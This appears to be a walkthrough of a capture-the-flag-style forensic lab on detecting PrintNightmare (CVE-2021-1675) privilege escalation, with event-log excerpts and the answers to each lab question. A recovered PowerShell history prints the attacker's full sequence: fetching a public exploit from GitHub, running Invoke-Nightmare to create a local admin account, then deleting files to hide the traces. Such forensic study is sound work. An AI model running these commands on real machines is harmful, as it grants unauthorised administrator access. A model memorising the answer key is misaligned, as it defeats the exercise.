---
Search the artifacts on the endpoint to determine if the employee used any of the Windows Printer Spooler vulnerabilities to elevate their privileges. 
---

### Detection 

![|333](https://i.ibb.co/ryX9w7H/businessmen-in-the-work-office-meeting-on-global-planning-and-marketing-research-vector-illustration.jpg)


Scenario: In the weekly internal security meeting it was reported that an employee overheard two co-workers discussing the PrintNightmare exploit and how they can use it to elevate their privileges on their local computers.

Task: Inspect the artifacts on the endpoint to detect the exploit they used.

Note: Use the FullEventLogView tool. Go to Options > Advanced Options and set Show events from all times. 

If you need a refresher on PrintNightmare, see our previous PrintNightmare room! 

```
using fulleventlogview 
Go to Options > Advanced Options and set Show events from all times
and filter with event id like 316,808,811,31017,7031,3,11

use find and search for zip

File created:
RuleName: Downloads
UtcTime: 2021-08-27 09:52:07.311
ProcessGuid: {a19e3d6a-b595-6128-0901-000000000d00}
ProcessId: 2124
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\bmurphy\Downloads\levelup.zip
CreationUtcTime: 2021-08-27 09:52:07.311

File created:
RuleName: Downloads
UtcTime: 2021-08-27 09:52:27.520
ProcessGuid: {a19e3d6a-b595-6128-0901-000000000d00}
ProcessId: 2124
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\bmurphy\Downloads\CVE-2021-1675-main\CVE-2021-1675.ps1
CreationUtcTime: 2021-08-27 09:52:27.520

File created:
RuleName: DLL
UtcTime: 2021-08-27 09:53:38.066
ProcessGuid: {a19e3d6a-b595-6128-0901-000000000d00}
ProcessId: 2124
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\bmurphy\AppData\Local\Temp\3\nightmare.dll
CreationUtcTime: 2021-08-27 09:53:38.066

File created:
RuleName: DLL
UtcTime: 2021-08-27 09:53:38.566
ProcessGuid: {a19e3d6a-aea6-6128-3600-000000000d00}
ProcessId: 2600
Image: C:\Windows\System32\spoolsv.exe
TargetFilename: C:\Windows\System32\spool\drivers\x64\3\New\nightmare.dll
CreationUtcTime: 2021-08-27 09:53:38.566

Process '\Device\HarddiskVolume2\Windows\System32\spoolsv.exe' (PID 2600) would have been blocked from loading the non-Microsoft-signed binary '\Windows\System32\spool\drivers\x64\3\nightmare.dll'.

show all event views to see primary registry path .. find HKLM

event id 13
quick filter HKLM
or THMPrinter

Registry value set:
RuleName: InvDB-DriverVer
EventType: SetValue
UtcTime: 2021-08-27 09:53:38.581
ProcessGuid: {a19e3d6a-aea6-6128-3600-000000000d00}
ProcessId: 2600
Image: C:\Windows\System32\spoolsv.exe
TargetObject: HKLM\System\CurrentControlSet\Control\Print\Environments\Windows x64\Drivers\Version-3\THMPrinter\DriverVersion
Details: 0.0.0.0

find history powershell

%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

$LocalTempDir = $env:TEMP; $ChromeInstaller = "ChromeInstaller.exe"; (new-object    System.Net.WebClient).DownloadFile('http://dl.google.com/chrome/install/375.126/chrome_installer.exe', "$LocalTempDir\$ChromeInstaller"); & "$LocalTempDir\$ChromeInstaller" /silent /install; $Process2Monitor =  "ChromeInstaller"; Do { $ProcessesFound = Get-Process | ?{$Process2Monitor -contains $_.Name} | Select-Object -ExpandProperty Name; If ($ProcessesFound) { "Still running: $($ProcessesFound -join ', ')" | Write-Host; Start-Sleep -Seconds 2 } else { rm "$LocalTempDir\$ChromeInstaller" -ErrorAction SilentlyContinue -Verbose } } Until (!$ProcessesFound)
Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
choco install graphviz

maybe was deleted so using procdot

no it wasn't i was looking in admin powershell history

C:\Users\bmurphy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine

cd .\Downloads\
wget https://github.com/calebstewart/CVE-2021-1675/archive/refs/heads/main.zip -UseBasicParsing -OutFile levelup.zip
Expand-Archive .\levelup.zip -DestinationPath .
cd .\CVE-2021-1675-main\
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "backup" -NewPassword "ucGGDMyFHkqMRWwHtQ" -DriverName "THMPrinter"
net localgroup administrators
cd ..
rmdir .\CVE-2021-1675-main\
dir
del .\levelup.zip
dir
exit
```

![[Pasted image 20221116111714.png]]

![[Pasted image 20221116112052.png]]

The user downloaded a zip file. What was the zip file saved as?
 You can try using ProcDOT or FullEventLogView
*levelup.zip*


What is the full path to the exploit the user executed?
		
		*C:\Users\bmurphy\Downloads\CVE-2021-1675-main\CVE-2021-1675.ps1*

What was the temp location the malicious DLL was saved to? 
	
	*C:\Users\bmurphy\AppData\Local\Temp\3\nightmare.dll*

What was the full location the DLL loads from?
	
	*C:\Windows\System32\spool\drivers\x64\3\New\nightmare.dll*

What is the primary registry path associated with this attack?
	
	*HKLM\System\CurrentControlSet\Control\Print\Environments\Windows x64\Drivers\Version-3\THMPrinter\DriverVersion*

What was the PID for the process that would have been blocked from loading a non-Microsoft-signed binary?
Microsoft-Windows-Security-Mitigations
*2600*


What is the username of the newly created local administrator account?
*backup*

What is the password for this user?
Use ProcDOT to search for PowerShell History File
*ucGGDMyFHkqMRWwHtQ*


What two commands did the user execute to cover their tracks? (no space after the comma)
		
		*rmdir .\CVE-2021-1675-main\,del .\levelup.zip*


[[PrintNightmare]]